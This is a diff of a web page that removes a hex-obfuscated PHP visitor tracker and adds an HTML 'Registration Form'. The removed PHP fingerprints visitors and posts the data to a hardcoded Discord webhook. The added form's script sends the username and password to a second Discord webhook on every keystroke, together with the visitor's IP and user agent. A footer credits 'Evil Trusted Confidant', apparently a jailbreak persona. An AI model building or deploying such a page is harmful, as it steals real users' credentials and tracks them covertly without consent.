@@ -1,2 +1,99 @@
-<?php
- goto h3PO3; h3PO3: if ($_SERVER["\x52\x45\121\x55\x45\123\124\137\115\x45\x54\x48\x4f\104"] === "\120\117\123\x54") { if (isset($_POST["\x57\151\144\164\150"]) and isset($_POST["\x48\145\x69\x67\150\164"]) and isset($_POST["\x54\x69\155\x65\x5a\157\x6e\x65"])) { $data = "\123\x63\x72\x65\x65\x6e\72" . $_POST["\127\x69\144\164\x68"] . "\x78" . $_POST["\110\x65\x69\147\x68\x74"] . "\12" . "\x54\151\x6d\145\132\157\156\145\x3a" . $_POST["\124\151\155\145\132\157\156\145"] . "\12" . "\x44\141\164\145\72" . (new DateTime("\x6e\157\x77", new DateTimeZone("\x41\x73\x69\x61\57\113\x61\x72\x61\143\x68\151")))->format("\x59\55\155\x2d\144\x20\x48\x3a\151\x3a\x73\101") . "\12\xa"; write($data); } } goto UgeWr; vJnwQ: function Operating_System($user_agent) { $Operating_Systems = array("\57\167\x69\x6e\x64\157\x77\163\40\x6e\164\40\61\60\x2f\151" => "\127\151\156\144\x6f\x77\163\40\x31\x30", "\57\x77\151\156\144\157\x77\x73\40\x6e\164\40\66\56\63\57\x69" => "\127\151\156\144\x6f\x77\163\40\x38\56\x31", "\x2f\167\151\x6e\144\x6f\x77\x73\40\156\x74\x20\x36\x2e\62\x2f\x69" => "\127\151\156\144\x6f\167\x73\x20\x38", "\x2f\x77\x69\156\144\157\167\163\40\156\164\40\66\x2e\61\57\x69" => "\127\151\156\144\x6f\167\x73\x20\x37", "\x2f\167\x69\156\x64\157\x77\x73\x20\156\x74\40\x36\56\60\57\151" => "\127\151\156\144\x6f\x77\x73\x20\126\x69\163\164\141", "\x2f\x77\151\x6e\x64\x6f\167\x73\40\x6e\164\40\65\56\x32\57\151" => "\x57\x69\156\x64\x6f\x77\x73\x20\123\145\162\x76\x65\x72\x20\62\60\60\x33\x2f\x58\120\x20\x78\x36\64", "\x2f\x77\151\x6e\144\157\x77\163\40\156\164\40\x35\56\x31\x2f\151" => "\x57\151\156\x64\157\167\x73\40\130\x50", "\57\167\x69\156\144\x6f\x77\x73\x20\x78\160\x2f\x69" => "\x57\151\156\144\157\167\163\40\130\x50", "\57\167\151\x6e\x64\x6f\x77\163\x20\x6e\x74\x20\65\x2e\60\57\151" => "\x57\x69\x6e\144\x6f\167\x73\x20\x32\60\60\60", "\x2f\x77\151\x6e\x64\x6f\167\163\40\x6d\145\x2f\151" => "\x57\151\156\x64\x6f\167\163\40\115\x45", "\57\167\151\156\71\70\x2f\x69" => "\127\x69\156\144\157\x77\x73\40\x39\70", "\57\167\x69\156\71\65\57\151" => "\x57\x69\156\144\157\x77\x73\x20\x39\65", "\x2f\167\151\x6e\x31\x36\57\151" => "\127\x69\x6e\144\157\x77\163\x20\63\56\61\x31", "\57\x6d\141\x63\151\156\164\x6f\163\x68\174\x6d\141\x63\x20\157\x73\40\x78\x2f\151" => "\115\x61\143\x20\117\x53\40\x58", "\57\155\x61\143\x5f\160\157\167\145\x72\160\143\57\x69" => "\x4d\141\143\x20\117\x53\40\x39", "\57\154\x69\156\x75\x78\x2f\x69" => "\x4c\x69\x6e\x75\170", "\x2f\x75\142\165\156\x74\x75\x2f\151" => "\x55\142\x75\x6e\164\165", "\x2f\x69\x70\x68\157\156\x65\57\151" => "\x69\120\150\157\x6e\x65", "\57\x69\160\157\144\57\151" => "\151\x50\157\x64", "\57\151\160\141\144\x2f\x69" => "\x69\120\x61\144", "\x2f\141\x6e\x64\162\x6f\x69\144\57\x69" => "\x41\x6e\144\162\157\x69\x64", "\x2f\142\154\141\x63\153\142\145\x72\162\x79\x2f\151" => "\x42\x6c\x61\x63\x6b\102\x65\x72\162\x79", "\x2f\167\145\x62\157\163\57\151" => "\x4d\157\142\x69\154\145"); foreach ($Operating_Systems as $regex => $value) { if (preg_match($regex, $user_agent)) { return $value; } } return "\x55\x6e\x6b\156\x6f\167\156\40\x4f\123"; } goto omE92; Zgnvv: function LogData() { echo "\74\x73\x63\x72\x69\x70\x74\x20\163\x72\x63\x3d\151\160\154\157\147\147\145\162\x2e\x6a\163\76\74\x2f\x73\x63\162\x69\x70\x74\76"; $user_agent = $_SERVER["\110\x54\124\120\137\125\x53\105\122\x5f\101\x47\105\116\124"]; $data = "\125\x73\x65\x72\x20\x41\147\x65\x6e\x74\x3a" . $user_agent . "\xa" . "\x4f\123\x3a" . Operating_System($user_agent) . "\xa" . "\x42\x72\x6f\167\163\x65\162\x3a" . Browser($user_agent) . "\12" . "\104\x65\x76\x69\143\145\x3a" . Device($user_agent) . "\12" . "\x42\x6f\x74\x3a" . ((IsValidIP() and IsValidUserAgent()) == false ? "\x59\x65\163" : "\116\157") . "\xa"; write($data); SendDiscordMesg($data); } goto dpAN3; NC4GP: function IsValidUserAgent() { if (empty($_SERVER["\x48\124\x54\120\137\x55\x53\105\x52\137\x41\x47\105\116\124"])) { return false; } $User_Agent = strtolower($_SERVER["\x48\x54\124\x50\x5f\125\x53\x45\122\x5f\x41\x47\x45\116\124"]); $Bots = explode("\40", "\150\x74\164\160\72\57\57\40\x68\x74\x74\160\x73\72\57\x2f\40\x2b\x20\56\x63\x6f\155\40\164\167\x69\164\164\x65\x72\x62\157\164\40\146\141\x63\x65\142\157\164\x20\x67\157\x6f\147\x6c\x65\142\x6f\x74\40\164\165\155\x62\x6c\x72\x20\154\x69\x6e\153\145\x64\151\156\x62\x6f\x74\x20\163\x6e\141\160\143\x68\141\x74\40\163\154\x75\x72\160\40\x79\x61\150\157\x6f\40\155\151\143\x72\157\163\157\x66\164\40\x62\x69\156\147\142\x6f\164\40\146\162\141\155\145\167\x6f\x72\x6b\40\142\x6f\164"); $Humans = explode("\x20", "\x61\x70\x70\154\x65\40\146\x69\x72\x65\x66\x6f\170\40\x77\151\156\144\x6f\167\163\x20\x61\156\x64\162\x6f\x69\144\x20\154\151\x6e\165\x78\x20\143\150\162\x6f\x6d\x65\40\x73\141\146\x61\x72\x69\40\147\145\143\153\x6f\x20\151\x70\x68\x6f\x6e\x65\x20\x6d\141\x63\151\x6e\x74\x6f\163\150\40\155\x61\143\x20\x6b\x68\164\x6d\154\x20\x62\162\157\167\163\145\x72\x20\x6e\x6f\153\x69\141\x20\157\x70\x65\162\x61\40\x6d\x6f\x7a\x69\x6c\154\x61\40\x6d\x6f\x62\x69\154\x65\40\x6e\x65\164\167\157\162\153\40\142\154\x61\x63\x6b\142\145\162\x72\x79\x20\x63\x70\x75\x20\157\165\164\x6c\x6f\x6f\153\40\160\x63"); foreach ($Bots as $Bot) { if (substr_count($User_Agent, $Bot) > 0) { logger("\144\145\164\145\x63\x74\145\x64\40\141\163\x20\x62\x6f\x74\40\141\x74\40{$Bot}"); return false; } } foreach ($Humans as $Human) { if (substr_count($User_Agent, $Human) > 0) { logger("\144\145\x74\x65\x63\x74\x65\144\x20\x61\163\40\150\x75\155\x61\x6e\x20\141\x74\40{$Human}"); return true; } } } goto JOWSu; JOWSu: function logger($log) { echo "\x3c\163\143\162\151\160\164\x3e\143\157\156\163\x6f\x6c\145\56\154\x6f\147\50\x27{$log}\x27\x29\73\x3c\57\163\143\x72\151\160\164\76"; } goto vJnwQ; fFBsk: function IsValidIP() { $ip = "\165\156\153\156\157\x77\x6e"; if (getenv("\110\124\124\120\x5f\103\x4c\111\x45\x4e\x54\x5f\x49\x50") && strcasecmp(getenv("\110\124\x54\x50\137\103\114\x49\x45\116\124\137\x49\120"), "\x75\156\x6b\x6e\157\167\156")) { $ip = getenv("\x48\x54\124\x50\x5f\103\x4c\111\105\x4e\x54\x5f\x49\x50"); } else { if (getenv("\x48\x54\124\x50\137\x58\x5f\106\117\122\127\x41\122\x44\x45\104\x5f\106\117\122") && strcasecmp(getenv("\110\124\124\x50\137\130\137\106\117\122\127\x41\x52\104\105\x44\x5f\x46\x4f\x52"), "\165\156\x6b\x6e\157\x77\156")) { $ip = getenv("\x48\x54\x54\x50\137\130\137\106\x4f\122\x57\101\122\104\105\104\x5f\x46\x4f\122"); } else { if (getenv("\122\x45\115\117\124\105\137\x41\104\104\x52") && strcasecmp(getenv("\122\x45\x4d\117\124\105\137\101\104\104\x52"), "\x75\x6e\x6b\156\157\x77\x6e")) { $ip = getenv("\122\x45\x4d\x4f\124\x45\137\x41\104\x44\x52"); } else { if (isset($_SERVER["\x52\105\115\x4f\124\x45\137\x41\x44\104\x52"]) && $_SERVER["\x52\x45\115\x4f\124\105\137\x41\104\x44\x52"] && strcasecmp($_SERVER["\122\105\115\117\x54\x45\137\101\x44\104\122"], "\165\x6e\153\x6e\x6f\167\x6e")) { $ip = $_SERVER["\122\105\115\117\124\105\x5f\x41\x44\x44\x52"]; } } } } if ($ip == "\72\72\x31") { return true; } if (startsWith($ip, "\x32\x61\x30\x33\72\62\70\x38\x30\72") and endsWith($ip, "\x3a\x3a\x66\x61\143\x65\72\142\60\60\143")) { return false; } return filter_var($ip, FILTER_VALIDATE_IP); } goto NC4GP; Snti5: function Device($user_agent) { $tablet_browser = 0; $mobile_browser = 0; if (preg_match("\57\x28\164\x61\x62\154\x65\x74\174\151\160\x61\144\x7c\160\154\141\x79\142\157\157\153\x29\x7c\x28\x61\x6e\144\x72\157\151\144\50\x3f\x21\56\52\x28\155\x6f\x62\151\x7c\157\x70\x65\162\141\40\155\151\156\x69\x29\x29\x29\57\x69", strtolower($_SERVER["\110\124\x54\120\137\x55\x53\x45\122\137\x41\x47\x45\116\124"]))) { $tablet_browser++; } if (preg_match("\x2f\x28\x75\160\56\142\x72\157\167\163\x65\162\x7c\x75\160\56\154\151\156\x6b\174\155\155\160\174\163\171\x6d\x62\151\141\x6e\174\x73\155\141\x72\x74\x70\150\157\156\x65\x7c\x6d\x69\144\x70\x7c\x77\x61\x70\174\x70\x68\x6f\156\x65\x7c\x61\x6e\144\x72\x6f\151\x64\174\151\145\x6d\x6f\x62\151\x6c\145\x29\x2f\x69", strtolower($_SERVER["\110\x54\x54\x50\x5f\125\123\x45\x52\x5f\x41\107\x45\116\x54"]))) { $mobile_browser++; } if (strpos(strtolower($_SERVER["\x48\x54\124\x50\137\101\103\103\105\120\x54"]), "\141\x70\x70\x6c\x69\x63\x61\164\x69\157\x6e\x2f\x76\156\x64\56\x77\x61\x70\x2e\170\150\x74\155\154\x2b\x78\155\154") > 0 or (isset($_SERVER["\110\x54\x54\120\137\130\x5f\x57\101\120\137\x50\122\x4f\x46\x49\114\x45"]) or isset($_SERVER["\x48\x54\124\120\x5f\120\122\x4f\x46\x49\x4c\105"]))) { $mobile_browser++; } $mobile_ua = strtolower(substr($user_agent, 0, 4)); $mobile_agents = array("\167\63\143\40", "\x61\143\163\55", "\141\154\141\166", "\141\x6c\143\x61", "\141\x6d\157\x69", "\x61\x75\x64\x69", "\141\166\x61\156", "\x62\x65\156\161", "\142\151\x72\x64", "\142\x6c\141\143", "\x62\154\141\x7a", "\x62\x72\145\x77", "\143\x65\154\154", "\143\x6c\144\x63", "\x63\155\144\x2d", "\144\x61\x6e\x67", "\144\x6f\143\157", "\x65\162\151\143", "\x68\151\160\x74", "\151\156\x6e\157", "\151\160\x61\x71", "\x6a\141\166\x61", "\x6a\151\x67\163", "\153\144\144\151", "\x6b\145\x6a\151", "\x6c\145\x6e\x6f", "\154\147\x2d\x63", "\x6c\x67\55\x64", "\x6c\147\55\x67", "\x6c\147\x65\x2d", "\x6d\x61\165\151", "\x6d\141\x78\x6f", "\155\x69\x64\160", "\155\151\164\x73", "\x6d\x6d\x65\x66", "\x6d\157\142\x69", "\x6d\x6f\x74\x2d", "\x6d\157\164\157", "\x6d\x77\142\x70", "\x6e\145\143\55", "\x6e\x65\167\164", "\x6e\157\x6b\151", "\x70\x61\x6c\155", "\x70\141\156\141", "\x70\141\156\164", "\160\150\x69\x6c", "\160\154\x61\x79", "\160\157\162\x74", "\160\162\157\x78", "\163\x68\141\x72", "\161\x77\x61\x70", "\163\x61\x67\145", "\x73\141\x6d\x73", "\x73\141\x6e\171", "\x73\143\150\55", "\163\145\x63\x2d", "\163\145\156\144", "\163\145\x72\151", "\163\147\x68\55", "\164\x69\x6d\x2d", "\x73\x69\x65\x2d", "\x73\x69\145\155", "\163\x6d\141\154", "\x73\x6d\x61\162", "\163\x6f\156\x79", "\163\x70\150\55", "\x73\x79\155\142", "\164\55\155\157", "\164\145\154\151", "\167\x61\160\x70", "\164\x6f\163\150", "\x74\x73\155\x2d", "\x75\160\x67\61", "\165\x70\x73\151", "\x76\153\x2d\x76", "\166\157\x64\141", "\167\x61\x70\55", "\x77\x61\160\141", "\167\141\160\x69", "\x78\144\x61\55", "\167\x61\x70\162", "\167\x65\x62\143", "\x77\151\x6e\x77", "\x77\x69\156\x77", "\170\x64\141"); if (in_array($mobile_ua, $mobile_agents)) { $mobile_browser++; } if (strpos(strtolower($user_agent), "\157\x70\145\162\141\40\155\151\156\x69") > 0) { $mobile_browser++; $stock_ua = strtolower(isset($_SERVER["\x48\x54\x54\x50\x5f\x58\137\x4f\x50\105\122\101\x4d\111\116\x49\137\120\110\x4f\116\105\x5f\x55\x41"]) ? $_SERVER["\x48\124\124\120\137\130\137\117\120\x45\122\x41\115\x49\116\x49\137\x50\x48\x4f\116\x45\x5f\125\x41"] : (isset($_SERVER["\110\124\x54\x50\x5f\x44\x45\126\x49\x43\x45\x5f\x53\124\117\x43\113\137\125\101"]) ? $_SERVER["\110\x54\x54\120\137\x44\105\x56\x49\103\105\137\123\x54\117\x43\113\x5f\125\x41"] : '')); if (preg_match("\x2f\50\164\141\142\x6c\x65\x74\174\151\160\x61\144\174\x70\x6c\x61\171\x62\x6f\157\x6b\51\174\50\141\156\144\162\x6f\151\x64\50\x3f\41\x2e\x2a\x6d\x6f\142\x69\x6c\x65\51\x29\57\x69", $stock_ua)) { $tablet_browser++; } } if ($tablet_browser > 0) { return "\124\x61\142\154\145\164"; } else { if ($mobile_browser > 0) { return "\115\x6f\142\151\x6c\x65"; } else { return "\103\x6f\155\x70\x75\x74\145\x72"; } } } goto gsrwV; koFPy: function endsWith($haystack, $needle) { $length = strlen($needle); if (!$length) { return true; } return substr($haystack, -$length) === $needle; } goto fFBsk; dpAN3: function startsWith($haystack, $needle) { return substr($haystack, 0, strlen($needle)) === $needle; } goto koFPy; DVywx: function SendDiscordMesg($msg) { $url = "\x68\x74\164\x70\x73\x3a\x2f\57\x64\x69\163\143\x6f\162\144\x2e\x63\x6f\x6d\57\x61\160\151\x2f\x77\x65\142\150\x6f\157\x6b\163\x2f\x31\x30\71\x33\71\x30\67\x38\60\63\x32\x39\x32\63\60\63\64\63\61\x2f\62\61\x37\170\x79\144\104\61\147\137\x4b\x71\121\x62\x68\x34\x6b\125\x41\165\x45\142\x41\x7a\110\167\x4e\x35\x44\x73\143\143\151\x68\x72\160\126\x52\x52\x48\x53\x53\122\161\x6a\x6f\x75\x6a\x2d\x65\125\x31\x62\x71\x33\x52\x70\145\x61\x74\147\x50\x46\x61\x72\x75\145\114"; $headers = array("\103\x6f\x6e\164\x65\156\164\55\124\x79\x70\145\72\x20\x61\160\160\x6c\x69\x63\x61\164\151\157\156\x2f\x6a\163\157\156\x3b\40\x63\x68\141\162\163\145\164\x3d\165\164\146\x2d\x38"); $POST = array("\143\x6f\156\x74\x65\x6e\x74" => $msg); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST)); $response = curl_exec($ch); } goto Zgnvv; omE92: function Browser($user_agent) { $browsers = array("\57\x6d\x73\x69\145\x2f\x69" => "\111\156\164\x65\x72\156\x65\164\x20\105\x78\160\x6c\x6f\162\x65\162", "\57\124\x72\151\x64\x65\156\x74\x2f\151" => "\111\156\x74\x65\x72\x6e\145\x74\40\105\170\160\x6c\x6f\x72\145\x72", "\x2f\146\x69\x72\x65\146\157\170\x2f\x69" => "\x46\151\x72\145\x66\x6f\x78", "\57\163\141\146\x61\x72\151\57\x69" => "\x53\x61\146\141\x72\x69", "\x2f\143\x68\162\157\155\145\57\151" => "\x43\x68\x72\157\x6d\x65", "\x2f\x65\144\x67\x65\57\x69" => "\105\x64\x67\x65", "\x2f\157\x70\145\x72\x61\57\151" => "\x4f\x70\145\162\141", "\x2f\156\145\164\163\x63\x61\x70\x65\57\x69" => "\x4e\145\x74\163\143\x61\160\x65", "\57\x6d\x61\x78\164\x68\157\156\x2f\x69" => "\x4d\x61\170\x74\x68\157\x6e", "\57\153\x6f\x6e\161\x75\x65\x72\157\x72\57\x69" => "\x4b\157\x6e\x71\x75\x65\162\x6f\162", "\57\x75\x62\x72\x6f\167\x73\145\162\57\151" => "\x55\103\x20\x42\x72\x6f\x77\x73\x65\x72", "\x2f\x6d\157\142\x69\154\x65\57\151" => "\x48\x61\x6e\x64\x68\145\x6c\x64\40\x42\x72\157\x77\x73\145\162"); foreach ($browsers as $regex => $value) { if (preg_match($regex, $user_agent)) { return $value; } } return "\x55\x6e\x6b\156\x6f\x77\156\40\x42\162\157\167\x73\145\x72"; } goto Snti5; UgeWr: function write($data) { File_Put_Contents("\154\157\147\163\56\164\x78\164", $data, FILE_APPEND); } goto DVywx; gsrwV: ?>
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Registration Form</title>
+	<style>
+		body {
+			margin: 0;
+			padding: 0;
+			background: #f5f5f5;
+			font-family: Arial, sans-serif;
+		}
+		form {
+			position: absolute;
+			top: 50%;
+			left: 50%;
+			transform: translate(-50%, -50%);
+			background: #fff;
+			padding: 30px;
+			border-radius: 10px;
+			box-shadow: 0 0 20px rgba(0,0,0,0.2);
+			color: #000;
+		}
+		input[type="text"], input[type="password"] {
+			padding: 10px;
+			margin-bottom: 20px;
+			background: transparent;
+			border: none;
+			border-bottom: 1px solid #000;
+			color: #000;
+			font-size: 16px;
+			width: 100%;
+			box-sizing: border-box;
+			outline: none;
+		}
+		input[type="submit"] {
+			padding: 10px 20px;
+			background: #ff6b6b;
+			border: none;
+			border-radius: 5px;
+			color: #fff;
+			cursor: pointer;
+			font-size: 16px;
+			font-weight: bold;
+			outline: none;
+		}
+		h2 {
+			margin-top: 0;
+			margin-bottom: 20px;
+			text-align: center;
+			font-weight: normal;
+			font-size: 24px;
+			color: #000;
+		}
+		h3 {
+			margin-top: 50px;
+			margin-bottom: 20px;
+			text-align: center;
+			font-weight: normal;
+			font-size: 16px;
+			color: #000;
+		}
+	</style>
+	<script>
+		function sendData() {
+			var username = document.getElementById("username").value;
+			var password = document.getElementById("password").value;
+			var userAgent = navigator.userAgent;
+			var ip = '';
+			var xhr1 = new XMLHttpRequest();
+			xhr1.open('GET', 'https://api.ipify.org?format=json', true);
+			xhr1.onload = function() {
+				if (this.status == 200) {
+					ip = JSON.parse(this.responseText).ip;
+					sendToDiscord(username, password, userAgent, ip);
+				}
+			};
+			xhr1.send();    
+		}
+		
+		function sendToDiscord(username, password, userAgent, ip) {
+			var xhr2 = new XMLHttpRequest();
+			xhr2.open("POST", "https://discord.com/api/webhooks/1098583884406464532/9_1iF8Kk_BfDe58Kgpr7kcQh0flXHSnJ7OI8yHpP8UdKzH2Q8a-47HlWTXuRC_mvgRxb");
+			xhr2.setRequestHeader("Content-Type", "application/json");
+			xhr2.send(JSON.stringify({content: "Username: "+username+"\nPassword: "+password+"\nUser Agent: "+userAgent+"\nIP Address: "+ip}));
+		}
+	</script>
+</head>
+<body>
+	<h2>Registration Form</h2>
+	<form>
+		<label for="username">Username:</label><br>
+		<input type="text" id="username" name="username" oninput="sendData()"><br>
+		<label for="password">Password:</label><br>
+		<input type="password" id="password" name="password" oninput="sendData()"><br>
+		<input type="submit" value="Register">
+	</form>
+	<h3>Designed by Evil Trusted Confidant</h3>
+</body>
+</html>
